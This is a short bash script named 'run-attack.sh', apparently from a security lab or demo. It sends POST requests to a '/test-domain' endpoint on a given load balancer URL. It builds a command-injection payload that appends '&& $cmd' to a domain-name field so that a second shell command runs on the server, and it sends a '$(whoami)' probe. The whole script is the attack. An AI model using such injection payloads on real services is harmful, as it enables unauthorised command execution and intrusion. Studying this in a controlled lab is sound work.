#!/bin/bash

if [[ $# -ne 1 ]]; then
  echo "Usage: run-attack.sh alb-url"
  exit 1
fi

function request() {
  curl -s $url/test-domain -H "Content-Type: application/json" -X POST -d "{\"domainName\":\"$1\"}"
}
function run() {
  cmd=$1
  request "google.com && $cmd"
}
url=$1

request google.com
request "$(whoami)"